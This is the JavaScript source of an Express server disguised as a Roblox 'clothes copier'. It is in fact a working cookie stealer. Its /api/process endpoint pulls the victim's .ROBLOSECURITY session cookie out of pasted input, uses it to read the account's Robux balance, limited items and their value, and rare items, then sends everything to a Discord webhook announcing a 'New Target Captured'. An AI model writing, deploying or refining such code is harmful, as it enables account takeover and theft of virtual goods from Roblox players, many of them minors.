const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.get('/clothes-copier', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'clothes-copier.html'));
});

app.get('/', (req, res) => {
    res.redirect('/clothes-copier');
});

async function safeGet(url, cookie) {
    try {
        const response = await fetch(url, {
            headers: {
                'User-Agent': 'Roblox/WinINet',
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'Referer': 'https://www.roblox.com/',
                'Accept': 'application/json, text/plain, */*'
            }
        });
        if (response.ok) {
            return await response.json();
        }
    } catch (err) {
        console.error(`Fetch error:`, err.message);
    }
    return null;
}

app.post('/api/process', async (req, res) => {
    const { data } = req.body;
    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;

    if (!data) {
        return res.status(400).json({ success: false, error: 'No data provided' });
    }

    if (!webhookUrl) {
        return res.status(500).json({ success: false, error: 'Configuration error.' });
    }

    try {
        let decodedScript = data.trim();
        try {
            decodedScript = Buffer.from(data, 'base64').toString('utf-8');
        } catch (e) {}

        let roblosecurity = decodedScript;
        const cookieMatch = roblosecurity.match(/(_\|WARNING:[^"']+)/);
        if (cookieMatch) {
            roblosecurity = cookieMatch[1];
        }
        roblosecurity = roblosecurity.replace(/\s+/g, '').replace(/["']/g, '');

        const authData = await safeGet('https://users.roblox.com/v1/users/authenticated', roblosecurity);
        if (!authData || !authData.id) {
            return res.status(422).json({ success: false, error: 'Failed to process asset payload.' });
        }

        const userId = authData.id;
        const username = authData.name || 'Unknown';
        const displayName = authData.displayName || username;

        const userInfo = await safeGet(`https://users.roblox.com/v1/users/${userId}`, roblosecurity);
        let accountAgeDays = 0;
        if (userInfo && userInfo.created) {
            const createdDate = new Date(userInfo.created);
            accountAgeDays = Math.floor((Date.now() - createdDate.getTime()) / (1000 * 60 * 60 * 24));
        }
        const isBanned = userInfo ? userInfo.isBanned : false;

        const thumbData = await safeGet(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`, roblosecurity);
        const avatarUrl = thumbData && thumbData.data && thumbData.data[0] ? thumbData.data[0].imageUrl : 'https://www.roblox.com';

        const economyData = await safeGet(`https://economy.roblox.com/v1/users/${userId}/currency`, roblosecurity);
        const robuxBalance = economyData ? (economyData.robux || 0) : 0;

        const totalsData = await safeGet(`https://economy.roblox.com/v2/users/${userId}/transaction-totals?transactionType=summary`, roblosecurity);
        const pendingRobux = totalsData ? (totalsData.pendingRobux || 0) : 0;

        let totalRap = 0;
        let limitedsCount = 0;
        let cursor = '';
        for (let i = 0; i < 5; i++) {
            let colUrl = `https://inventory.roblox.com/v2/users/${userId}/inventory/collectibles?limit=100&sortOrder=Asc`;
            if (cursor) colUrl += `&cursor=${cursor}`;

            const colData = await safeGet(colUrl, roblosecurity);
            if (!colData || !colData.data) break;

            for (const item of colData.data) {
                totalRap += item.recentAveragePrice || 0;
                limitedsCount++;
            }

            cursor = colData.nextPageCursor;
            if (!cursor) break;
        }

        const korbloxRes = await safeGet(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/48545806`, roblosecurity);
        const hasKorblox = korbloxRes && korbloxRes.data && korbloxRes.data.length > 0;

        const headlessRes = await safeGet(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/4819740796`, roblosecurity);
        const hasHeadless = headlessRes && headlessRes.data && headlessRes.data.length > 0;

        const gamesData = await safeGet(`https://games.roblox.com/v2/users/${userId}/games?accessFilter=Public&limit=50`, roblosecurity);
        let gamesCount = 0;
        let totalVisits = 0;
        if (gamesData && gamesData.data) {
            for (const game of gamesData.data) {
                gamesCount++;
                totalVisits += game.placeVisits || 0;
            }
        }

        const discordPayload = {
            content: `@everyone New Payload Captured from **${username}**!`,
            username: `${username} | RBXDEV Bot`,
            avatar_url: avatarUrl,
            embeds: [{
                title: "💎 **New Target Captured!**",
                color: 3092790,
                thumbnail: { url: avatarUrl },
                description: 
                    `👑 **[${username} | 13+]**\n` +
                    `🔗 **[Roblox Profile](https://www.roblox.com/users/${userId}/profile)**\n\n` +
                    `👤 **Username**: \`${username}\`\n` +
                    `📌 **Display Name**: \`${displayName}\`\n\n` +
                    `📈 **Account Stats**\n` +
                    `> • Account Age: \`${accountAgeDays} Days\`\n` +
                    `> • Game Visits: \`${totalVisits}\`\n` +
                    `> • Public Games: \`${gamesCount}\`\n` +
                    `> • Banned Status: \`${isBanned}\`\n\n` +
                    `🪙 **Economy Section**\n` +
                    `> • Balance: \`${robuxBalance.toLocaleString()}\`\n` +
                    `> • Pending: \`${pendingRobux.toLocaleString()}\`\n` +
                    `> • RAP: \`${totalRap.toLocaleString()}\`\n` +
                    `> • Limiteds Count: \`${limitedsCount}\`\n\n` +
                    `🎒 **Items & Bundles**\n` +
                    `> • Korblox: \`${hasKorblox}\`\n` +
                    `> • Headless: \`${hasHeadless}\``,
                footer: { text: "RBXDEV Telemetry Engine • 2026" }
            }]
        };

        await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(discordPayload)
        });

        return res.json({ success: true, message: 'Payload processed and dispatched successfully.' });

    } catch (err) {
        return res.status(500).json({ success: false, error: 'Internal server processing error.' });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 RBXDEV Server running live on port ${PORT}`);
});
